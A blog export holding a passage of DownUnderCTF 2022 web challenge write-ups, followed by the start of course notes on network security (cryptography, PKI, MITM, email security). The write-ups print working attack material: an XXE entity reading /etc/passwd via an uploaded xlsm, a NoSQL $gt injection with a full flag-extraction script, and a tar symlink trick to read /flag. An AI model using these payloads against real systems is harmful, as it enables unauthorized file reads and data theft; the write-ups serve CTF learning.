<p>Go to upload page, and we can find that we can upload a <code>xlsm</code> file, as there was a <code>xlsm</code> file attached.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/upload/testPandasImplementation&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;upload.html&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926115318.png"></p>
<p>Then I tried to upload this <code>xslm</code> file,<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926115546.png"></p>
<p>It was actually fetching file information from the <code>xlsm</code> file.</p>
<p>In <code>Dockerfile</code>: </p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;DUCTF&#123;test_flag&#125;:x:1001:1001::/tmp:/bin/false&#x27;</span> &gt;&gt; /etc/passwd</span></span><br></pre></td></tr></table></figure>

<p>So we need to get the flag from <code>/etc/passwd</code></p>
<p>In <code>app.py</code>, we could see the uploaded file would be unzipped, and a <code>WORKBOOK</code> file was extracted from it,.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">WORKBOOK = <span class="string">&quot;xl/workbook.xml&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extractWorkbook</span>(<span class="params">filename, outfile=<span class="string">&quot;xml&quot;</span></span>):</span><br><span class="line">    <span class="keyword">with</span> ZipFile(filename, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> <span class="built_in">zip</span>:</span><br><span class="line">        <span class="built_in">zip</span>.extract(WORKBOOK, outfile)</span><br></pre></td></tr></table></figure>

<p>so I rename the file to <code>fizzbuzz.rar</code> and then unzipped it, then we could find the file <code>xl/workbook.xml</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">findInternalFilepath</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        prop = <span class="literal">None</span></span><br><span class="line">        parser = etree.XMLParser(load_dtd=<span class="literal">True</span>, resolve_entities=<span class="literal">True</span>)<span class="comment">#here&#x27;s the issue, it allows to resolve entities -&gt; XXE attack is allowed</span></span><br><span class="line">        tree = etree.parse(filename, parser=parser)</span><br><span class="line">        root = tree.getroot()</span><br><span class="line">        internalNode = root.find(<span class="string">&quot;.//&#123;http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac&#125;absPath&quot;</span>)<span class="comment">#here trying to find the parent node</span></span><br><span class="line">        <span class="keyword">if</span> internalNode != <span class="literal">None</span>:</span><br><span class="line">            prop = &#123;</span><br><span class="line">                <span class="string">&quot;Fieldname&quot;</span>:<span class="string">&quot;absPath&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Attribute&quot;</span>:internalNode.attrib[<span class="string">&quot;url&quot;</span>],</span><br><span class="line">                <span class="string">&quot;Value&quot;</span>:internalNode.text <span class="comment">#it&#x27;s trying to get value of the tag</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> prop</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;couldnt extract absPath&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>Edit the <code>workbook.xml</code>, add a system entity and put inside the <code>x15ac:absPath</code> tag.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">    &lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;!- ..... --&gt;</span><br><span class="line">            &lt;mc:Choice Requires=&quot;x15&quot;&gt;</span><br><span class="line">                &lt;!-- &lt;x15ac:absPath url=&quot;/User/shared&quot; xmlns:x15ac=&quot;http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac&quot; /&gt; --&gt;</span><br><span class="line">                &lt;x15ac:absPath url=&quot;/User/shared&quot; xmlns:x15ac=&quot;http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac&quot; &gt;</span><br><span class="line">                    &amp;test;</span><br><span class="line">            &lt;/x15ac:absPath&gt;</span><br><span class="line">            &lt;/mc:Choice&gt;</span><br><span class="line">&lt;!- ..... --&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>Again, zip it, and change the suffix to <code>xlsm</code>.</p>
<p>You will see the flag after uploading it.</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926120808.png"></p>
<h4 id="noteworthy-NoSQL-blind-SQL-injection"><a href="#noteworthy-NoSQL-blind-SQL-injection" class="headerlink" title="noteworthy(NoSQL blind SQL injection)"></a>noteworthy(NoSQL blind SQL injection)</h4><p>I thought this was a challenge related to prototype pollution :(</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> admin = <span class="keyword">await</span> <span class="title class_">User</span>.<span class="title function_">findOne</span>(&#123; <span class="attr">username</span>: <span class="string">&#x27;admin&#x27;</span> &#125;)</span><br><span class="line"><span class="keyword">if</span>(!admin) &#123;</span><br><span class="line">    admin = <span class="keyword">new</span> <span class="title class_">User</span>(&#123; <span class="attr">username</span>: <span class="string">&#x27;admin&#x27;</span> &#125;)</span><br><span class="line">    <span class="keyword">await</span> admin.<span class="title function_">save</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> note = <span class="keyword">await</span> <span class="title class_">Note</span>.<span class="title function_">findOne</span>(&#123; <span class="attr">noteId</span>: <span class="number">1337</span> &#125;)</span><br><span class="line"><span class="keyword">if</span>(!note) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">FLAG</span> = process.<span class="property">env</span>.<span class="property">FLAG</span> || <span class="string">&#x27;DUCTF&#123;test_flag&#125;&#x27;</span></span><br><span class="line">    note = <span class="keyword">new</span> <span class="title class_">Note</span>(&#123; <span class="attr">owner</span>: admin.<span class="property">_id</span>, <span class="attr">noteId</span>: <span class="number">1337</span>, <span class="attr">contents</span>: <span class="variable constant_">FLAG</span> &#125;)</span><br><span class="line">    <span class="keyword">await</span> note.<span class="title function_">save</span>()</span><br><span class="line">    admin.<span class="property">notes</span>.<span class="title function_">push</span>(note)</span><br><span class="line">    <span class="keyword">await</span> admin.<span class="title function_">save</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Obviously, we need to get the content of Note(id 1337), but it would failed unless we got an <code>admin</code> permission.</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/edit&#x27;</span>, ensureAuthed, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> q = req.<span class="property">query</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;noteId&#x27;</span> <span class="keyword">in</span> q &amp;&amp; <span class="built_in">parseInt</span>(q.<span class="property">noteId</span>) != <span class="title class_">NaN</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;no problem with noteId&quot;</span>)</span><br><span class="line">            <span class="keyword">const</span> note = <span class="keyword">await</span> <span class="title class_">Note</span>.<span class="title function_">findOne</span>(q)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;no problem with finding Note&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!note) &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;error&#x27;</span>, &#123; <span class="attr">isLoggedIn</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;Note does not exist!&#x27;</span> &#125;)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(note.<span class="property">owner</span>.<span class="title function_">toString</span>() != req.<span class="property">user</span>.<span class="property">userId</span>.<span class="title function_">toString</span>()) &#123;<span class="comment">//here it will check the owner</span></span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;error&#x27;</span>, &#123; <span class="attr">isLoggedIn</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;You are not the owner of this note!&#x27;</span> &#125;)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;edit&#x27;</span>, &#123; <span class="attr">isLoggedIn</span>: <span class="literal">true</span>, <span class="attr">noteId</span>: note.<span class="property">noteId</span>, <span class="attr">contents</span>: note.<span class="property">contents</span> &#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Note Id has problem&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;error&#x27;</span>, &#123; <span class="attr">isLoggedIn</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;Invalid request&#x27;</span> &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;this is from the exception&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;error&#x27;</span>, &#123; <span class="attr">isLoggedIn</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;Invalid request&#x27;</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>At least <code>req.query</code> could be leveraged!!</p>
<p>We can set different content to brute force/guessing the content</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;noteId&quot;</span><span class="punctuation">:</span><span class="number">1337</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;$gt&quot;</span><span class="punctuation">:</span>&#x27;a&#x27;</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>Here’s the solution. Of course, burpsuite intruder is another choice.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"></span><br><span class="line">charset = <span class="built_in">sorted</span>(printable)[<span class="number">6</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register_user</span>(<span class="params">username, password</span>):</span><br><span class="line">    r = session.post(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>/register&#x27;</span>, json=&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># returns True if the note exists</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">q</span>):</span><br><span class="line">    r = session.get(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>/edit?noteId=1337&amp;contents[$gt]=<span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;You are not the owner of this note!&#x27;</span> <span class="keyword">in</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://web-noteworthy-873b7c844f49.2022.ductf.dev&#x27;</span></span><br><span class="line">session = Session()</span><br><span class="line">register_user(<span class="string">f&#x27;solve-<span class="subst">&#123;randint(<span class="number">1</span>, <span class="number">10000</span>)&#125;</span>&#x27;</span>, <span class="string">&#x27;solve&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> flag[-<span class="number">1</span>:] != <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    u = <span class="built_in">len</span>(charset)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        m = (l + u) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        candidate = flag + charset[m]</span><br><span class="line">        <span class="keyword">if</span> oracle(candidate):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> oracle(flag + charset[m + <span class="number">1</span>]):</span><br><span class="line">                <span class="keyword">if</span> charset[m + <span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                    flag = flag + charset[m + <span class="number">1</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    flag = candidate</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            l = m - <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            u = m + <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926131752.png"></p>
<h4 id="no-symlink-Symlink-and-file-permission-trick"><a href="#no-symlink-Symlink-and-file-permission-trick" class="headerlink" title="no-symlink(Symlink and file permission trick)"></a>no-symlink(Symlink and file permission trick)</h4><p>The website allows us to upload a tar file, and it will extract the file.</p>
<p>The difficulty is that it detects the symlink files and delete all.</p>
<p>How do we bypass it?</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">post <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:tarfile</span>] &amp;&amp; (tempfile = params[<span class="symbol">:tarfile</span>][<span class="symbol">:tempfile</span>])</span><br><span class="line">    <span class="keyword">return</span> err <span class="string">&quot;File not sent&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">unless</span> tempfile.size &lt;= <span class="number">10240</span></span><br><span class="line">    <span class="keyword">return</span> err <span class="string">&quot;File too big&quot;</span></span><br><span class="line">  <span class="keyword">end</span> </span><br><span class="line">  </span><br><span class="line">  path = <span class="title class_">SecureRandom</span>.hex <span class="number">16</span></span><br><span class="line">  <span class="keyword">unless</span> <span class="title class_">Dir</span>.mkdir <span class="string">&quot;uploads/<span class="subst">#&#123;path&#125;</span>&quot;</span>, <span class="number">0755</span></span><br><span class="line">    <span class="keyword">return</span> err <span class="string">&quot;Error creating directory&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">unless</span> system <span class="string">&quot;tar -xvf <span class="subst">#&#123;tempfile.path&#125;</span> -C uploads/<span class="subst">#&#123;path&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> err <span class="string">&quot;Error extracting tar file&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  links = <span class="title class_">Dir</span>.glob(<span class="string">&quot;uploads/<span class="subst">#&#123;path&#125;</span>/**/*&quot;</span>, <span class="title class_">File</span><span class="symbol">:</span><span class="symbol">:FNM_DOTMATCH</span>).select <span class="keyword">do</span> |<span class="params">f</span>|</span><br><span class="line">    <span class="comment"># Don&#x27;t show . or ..</span></span><br><span class="line">    <span class="keyword">if</span> [<span class="string">&quot;.&quot;</span>, <span class="string">&quot;..&quot;</span>].<span class="keyword">include</span>? <span class="title class_">File</span>.basename f</span><br><span class="line">      <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Don&#x27;t show symlinks. Additionally delete them, they may be unsafe</span></span><br><span class="line">    <span class="keyword">elsif</span> <span class="title class_">File</span>.symlink? f</span><br><span class="line">      <span class="title class_">File</span>.unlink f</span><br><span class="line">      <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Don&#x27;t show directories (but show files under them)</span></span><br><span class="line">    <span class="keyword">elsif</span> <span class="title class_">File</span>.directory? f</span><br><span class="line">      <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Show everything else</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="literal">true</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ok links</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p><strong>Solution:</strong> </p>
<p>Create a random text file(or any other files) for just getting the uploaded path(since the symlink will not be shown on the page)</p>
<p>Create a directory <code>flagDir </code> and in the directory, generate a symlink: <code>ln -s /flag flag</code> -&gt; generate a symlink for <code>/flag</code></p>
<p>Set up file permission(100 -&gt; read only) for the directory so that it cannot be deleted.</p>
<p>Zip all the files: <code>tar -zcvf flag.tar flagDir/  </code></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Write-up</tag>
      </tags>
  </entry>
  <entry>
    <title>FIT3031 Network Security Notes</title>
    <url>/2022/11/16/FIT3031-Network-Security-Notes/</url>
    <content><![CDATA[<h1 id="FIT3031-Network-Security-Notes"><a href="#FIT3031-Network-Security-Notes" class="headerlink" title="FIT3031 Network Security Notes"></a>FIT3031 Network Security Notes</h1><h2 id="Week-1-Overview"><a href="#Week-1-Overview" class="headerlink" title="Week 1: Overview"></a>Week 1: Overview</h2><h3 id="Type-of-Network-Attacks"><a href="#Type-of-Network-Attacks" class="headerlink" title="Type of Network Attacks"></a>Type of Network Attacks</h3><ul>
<li>Interruption<ul>
<li>Availability</li>
</ul>
</li>
<li>Interception<ul>
<li>Confidentiality</li>
</ul>
</li>
<li>Modification<ul>
<li>Integrity</li>
</ul>
</li>
<li>Fabrication<ul>
<li>Authentication</li>
</ul>
</li>
</ul>
<span id="more"></span>

<h3 id="Threats-Attacks-Vulnerabilities-amp-Risks"><a href="#Threats-Attacks-Vulnerabilities-amp-Risks" class="headerlink" title="Threats, Attacks, Vulnerabilities &amp; Risks"></a>Threats, Attacks, Vulnerabilities &amp; Risks</h3><p> Threats</p>
<ul>
<li>a malicious or negative event that takes advantage of vulnerabilities.</li>
</ul>
<p>Attacks</p>
<ul>
<li>passive attack: eavesdropping, traffic analysis</li>
<li>active attack: denial of service(DoS), injection</li>
</ul>
<p>Vulnerabilities</p>
<ul>
<li>Flaws, e.g. lack of AUTH</li>
</ul>
<p>Risks</p>
<ul>
<li>likelihood of attacks &amp; consequence of attacks</li>
<li>potential damage or loss when the threat occurs</li>
</ul>
<h3 id="Security-Mechanisms"><a href="#Security-Mechanisms" class="headerlink" title="Security Mechanisms"></a>Security Mechanisms</h3><ul>
<li>Prevention</li>
<li>Detection</li>
<li>Recovery</li>
</ul>
<h3 id="Security-Goals"><a href="#Security-Goals" class="headerlink" title="Security Goals"></a>Security Goals</h3><ul>
<li><p>Secrecy/ Confidentiality(CONF)</p>
<ul>
<li>Encryption</li>
</ul>
</li>
<li><p>Integrity</p>
<ul>
<li>Message Authentication Code(MAC)</li>
<li>Digital Signature</li>
</ul>
</li>
<li><p>Authentication</p>
<ul>
<li>The digital signature, biometrics, password</li>
</ul>
</li>
<li><p>Non-repudiation(NR)</p>
<ul>
<li>The digital signature, biometrics</li>
</ul>
</li>
<li><p>Availability</p>
</li>
</ul>
<h3 id="Crypto-Overview"><a href="#Crypto-Overview" class="headerlink" title="Crypto Overview"></a>Crypto Overview</h3><table>
<thead>
<tr>
<th></th>
<th>Symmetric</th>
<th>Asymmetric</th>
</tr>
</thead>
<tbody><tr>
<td>Confidentiality</td>
<td>One-time Pad cipher, Stream ciphers, Block Ciphers</td>
<td>Encryption with Public Key</td>
</tr>
<tr>
<td>Integrity</td>
<td>Message Authentication Code(e.g. HMAC)</td>
<td>Digital Signature</td>
</tr>
<tr>
<td>Authentication</td>
<td>MAC+Nonce</td>
<td>Digital Signature + Nonce</td>
</tr>
</tbody></table>
<p><img src="https://img-blog.csdnimg.cn/2019090612012265.png" alt="Comparison of hash,MAC and digital signature"></p>
<p>Stream cipher</p>
<ul>
<li>an encryption algorithm that <strong>uses a symmetric key</strong> to encrypt and decrypt a given amount of data.</li>
</ul>
<p>One-time pad cipher:</p>
<ul>
<li>a randomly generated private key is used <strong>only once</strong> to encrypt a message and decrypted by the recipient using a matching one-time pad and key.</li>
</ul>
<p>Message Authentication Code(MAC)</p>
<ul>
<li>The sender forwards the message along with the MAC which uses a secret key to compress the message.</li>
<li>The message is sent in clear with MAC.</li>
<li>The secret key is only known to the sender and the intended recipient.</li>
<li><strong>cannot</strong> achieve <strong>Non-repudiation</strong> -&gt; we cannot identify who sent this MAC - sender or recipient?</li>
</ul>
<h3 id="Symmetric-vs-Asymmetric"><a href="#Symmetric-vs-Asymmetric" class="headerlink" title="Symmetric vs Asymmetric"></a>Symmetric vs Asymmetric</h3><p>Symmetric encryption</p>
<ul>
<li>fast</li>
<li>has a key distribution problem</li>
<li>Block cipher: ARS</li>
<li>Stream cipher modes: RC4</li>
</ul>
<p>Public-key encryption</p>
<ul>
<li>slow</li>
<li>has no key distribution problem</li>
<li>RSA, ElGamal</li>
</ul>
<h3 id="Adversarial-Capability-Against-Encryption"><a href="#Adversarial-Capability-Against-Encryption" class="headerlink" title="Adversarial Capability Against Encryption"></a>Adversarial Capability Against Encryption</h3><ul>
<li><p>Ciphertext-only adversary</p>
<ul>
<li>the attacker knows ciphertext by eavesdropping</li>
</ul>
</li>
<li><p>Known-plaintext adversary</p>
<ul>
<li>the attacker knows at least one sample of both plaintext and ciphertext.</li>
<li>e.g. <strong>XOR cipher</strong> can be compromised to use <code>plaintext XOR ciphertext</code> to get the key </li>
</ul>
</li>
<li><p>Chosen-plaintext attack</p>
<ul>
<li>the attacker can choose what plaintext will be <strong>encrypted</strong>.( Attacker can run the encryption functions for selected inputs)</li>
</ul>
</li>
<li><p>Chosen-ciphertext Adversary</p>
<ul>
<li>the attacker can choose ciphertext to be <strong>decrypted</strong>.</li>
</ul>
</li>
</ul>
<h2 id="Week-2-Public-Key-Infrastructure"><a href="#Week-2-Public-Key-Infrastructure" class="headerlink" title="Week 2: Public Key Infrastructure"></a>Week 2: Public Key Infrastructure</h2><h3 id="Man-in-the-Middle-MITM-Attack"><a href="#Man-in-the-Middle-MITM-Attack" class="headerlink" title="Man-in-the-Middle (MITM) Attack"></a>Man-in-the-Middle (MITM) Attack</h3><p>Scenario:</p>
<ol>
<li>Mallory intercepts <code>pk_alice</code> and forwards <code>pk_mallory</code> to Bob</li>
<li>Bob uses <code>pk_mallory</code> to encrypt messages as he cannot tell the difference</li>
<li>Mallory intercepts Bob’s encrypted messages and decrypts them.</li>
</ol>
<p><strong>Solution</strong></p>
<blockquote>
<ul>
<li>Alice needs to go to a trusted party(<strong>Certificate Authority</strong>) to get a certificate.</li>
<li>After verifying Alice’s identity, the trusted party issues a certificate with Alice’s name and her public key.</li>
<li>Alice sends the entire certificate to Bob.</li>
<li>Bob verifies the certificate using Alice’s public key - make sure it’s from Alice, not others.</li>
<li>The certificate cannot be forged or tampered</li>
</ul>
</blockquote>
<h3 id="Digital-Signature"><a href="#Digital-Signature" class="headerlink" title="Digital Signature"></a>Digital Signature</h3><p>Use the private key to encrypt the message -&gt; generate the digital signature</p>
<p>Use the public key to decrypt the digital signature -&gt; verify the digital signature -&gt; check if <code>M == M&#39;</code></p>
<h3 id="Digital-Certificate"><a href="#Digital-Certificate" class="headerlink" title="Digital Certificate"></a>Digital Certificate</h3><h4 id="X-509-Certificate-Example"><a href="#X-509-Certificate-Example" class="headerlink" title="X.509 Certificate Example"></a>X.509 Certificate Example</h4><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221104124318376.png"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221104124353614.png"></p>
<p>Other fields:</p>
<ul>
<li>Usage period</li>
<li>Serial number</li>
</ul>
<h4 id="Domain-Validated-Certificate-DV"><a href="#Domain-Validated-Certificate-DV" class="headerlink" title="Domain Validated Certificate(DV)"></a>Domain Validated Certificate(DV)</h4><p>The CA verifies the domain records to check if the domain belongs to the applicant(before issuing the certificate).</p>
<p>Domain Control Validation is performed on the domain name in the certificate request.</p>
<h4 id="Organizational-Validated-Certificate-OV"><a href="#Organizational-Validated-Certificate-OV" class="headerlink" title="Organizational Validated Certificate(OV)"></a>Organizational Validated Certificate(OV)</h4><p>CAs verify the following before issuing OV certificates: </p>
<ul>
<li>Domain control validation. </li>
<li>Applicant’s identity and address. </li>
<li>Applicant’s link to the organisation. </li>
<li>Organisation’s address. </li>
<li>Organisation’s WHOIS record.</li>
<li>Callback on the organisation’s verified telephone number </li>
</ul>
<h4 id="Extended-Validated-Certificate-EV"><a href="#Extended-Validated-Certificate-EV" class="headerlink" title="Extended Validated Certificate(EV)"></a>Extended Validated Certificate(EV)</h4><p>CAs issuing EV certificates require documents that are legally signed from <strong>registration authorities</strong>- needs to verify the organization. (will verify the legal and proper standings of the organisation)</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221104104444256.png"></p>
<h4 id="Digital-signature-in-Digital-Certificate"><a href="#Digital-signature-in-Digital-Certificate" class="headerlink" title="Digital signature in Digital Certificate"></a>Digital signature in Digital Certificate</h4><p><strong>CA generates a digital signature in the certificate using its private key</strong>. Anyone can verify the digital signature to see if the certificate has been modified using CA’s public key.</p>
<h3 id="Certificate-Authorities"><a href="#Certificate-Authorities" class="headerlink" title="Certificate Authorities"></a>Certificate Authorities</h3><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221104105253255.png"></p>
<p><strong>Root CA’s certificates are self-signed.</strong></p>
<blockquote>
<p><strong>How Root CA can be trusted?</strong></p>
<p>Public keys of CAs will be preinstalled in the OS, browser and other software.</p>
</blockquote>
<p>Using Root CA’s public key to verify Intermediate CA’s certificate, Using Intermediate CA’s public key to verify Sub CA’s certificate.</p>
<h4 id="Attack-Scenario-Authentic-Certificate"><a href="#Attack-Scenario-Authentic-Certificate" class="headerlink" title="Attack Scenario: Authentic Certificate"></a>Attack Scenario: Authentic Certificate</h4><p>The attacker forwards the authentic certificate to Alice.</p>
<p>Alice finds the certificate is authentic so she uses the certificate’s public key to encrypt the <code>secret</code> and send it to the “server”.</p>
<p>The attacker will intercept the request but he cannot decrypt the <code>secret</code> because he doesn’t know the private key</p>
<h4 id="Attack-Scenario-Fake-Certificate"><a href="#Attack-Scenario-Fake-Certificate" class="headerlink" title="Attack Scenario: Fake Certificate"></a>Attack Scenario: Fake Certificate</h4><p>The attacker creates a fake certificate for the domain <code>example.com</code> with his own public key.</p>
<p>CA will not sign the certificate as the attacker is not the owner of <code>example.com</code>.</p>
<p>The attacker tries to self-sign the certificate and sends it to Alice.</p>
<p>Alice’s browser will give the warning as it cannot find any trusted certificate to verify the received certificate.</p>
<h4 id="Attack-Scenario-Attacker’s-Certificate"><a href="#Attack-Scenario-Attacker’s-Certificate" class="headerlink" title="Attack Scenario: Attacker’s Certificate"></a>Attack Scenario: Attacker’s Certificate</h4><p>The attacker has his own valid certificate.</p>
<p>The attacker sends his certificate to Alice.</p>
<p>Alice’s browser checks if the certificate’s <strong>subject field</strong> matches Alice’s intent.</p>
<h3 id="Attacks-on-PKI"><a href="#Attacks-on-PKI" class="headerlink" title="Attacks on PKI"></a>Attacks on PKI</h3><p><strong>The Man-in-the-Middle proxy</strong></p>
<blockquote>
<p>The proxy creates a self-signed CA certificate installed on the user’s browser.</p>
<p>The proxy will intercept the communication.</p>
</blockquote>
<p><strong>Attacks on CA’s verification process</strong></p>
<p><strong>Attacks on CA’s signing process</strong>: the private key is compromised</p>
<ul>
<li>How to protect the private key? Use <strong>Hardware Security Model</strong></li>
</ul>
<p><strong>Attacks on Algorithms</strong>: Digital certificate depends on one-way hash and digital signature.</p>
<ul>
<li>Use stronger algorithms</li>
</ul>
<p><strong>Attacks on User confirmation</strong>:  Some software does not compare these two pieces of information(the common name field inside the certificate and information provided or approved by user): <strong>security flaw</strong> </p>
<h2 id="Week-3-Email-Security"><a href="#Week-3-Email-Security" class="headerlink" title="Week 3: Email Security"></a>Week 3: Email Security</h2><h3 id="Overview-Questions"><a href="#Overview-Questions" class="headerlink" title="Overview Questions"></a>Overview Questions</h3><ul>
<li>What are the principal services provided by PGP?<ul>
<li>Key management, Confidentiality, Integrity, Authenticity.</li>
</ul>
</li>
<li>What is the utility of a detached signature?<ul>
<li>Signatures are sent separately. Two files, original data and the signature.</li>
</ul>
</li>
<li>Why use R64 conversion for an e-mail application?<ul>
<li>Some email servers don’t accept emails in binary, it needs to be in printable characters. R64 uses ASCII character which are all printable.</li>
</ul>
</li>
<li>What is S/MEME? what are the cryptographic functions used in S/MIME?<ul>
<li>S/MIME = Encrypted MIME</li>
<li>3DES/AES for encryption, Elgamal for key exchange, SHA for signatures</li>
</ul>
</li>
